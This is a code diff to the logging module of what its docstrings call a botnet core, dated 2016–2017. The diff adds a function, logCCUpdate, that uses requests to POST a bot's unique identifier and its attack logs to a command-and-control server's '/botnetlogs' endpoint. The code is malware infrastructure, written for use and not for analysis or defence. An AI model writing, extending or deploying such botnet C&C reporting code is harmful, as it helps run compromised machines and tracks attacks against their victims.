@@ -6,9 +6,10 @@ it is simply performed at the end of the attack, to ensure performances
 and robustness to the botnet core.
 
 Created:    27 December 2016
-Modified:   28 December 2016
+Modified:   14 January  2017
 """
 from datetime import datetime 
+import requests
 
 
 def logInfo(log_file, message, attack=False):
@@ -66,3 +67,23 @@ def logAttack(log_file, attack_dict):
     logInfo(log_file, attackStory, attack=True)
 
     return
+
+
+def logCCUpdate(server, id, logdata):
+    """
+    This utility is designed to log a string into C&C, it is designed
+    mainly to support attack statistics.
+
+    @param server, string - C&C remote address
+    @param id, string - botnet unique identifier
+    @param logdata, data - data to be logged into C&C
+    @return wheter update is valid
+    """
+
+    try:
+        cc_config = requests.post(server + '/botnetlogs', data = {'botnet': id, 'log': logdata})
+    except Exception as e:
+        # if an error occurred, we return a non updated status
+        return False
+
+    return True
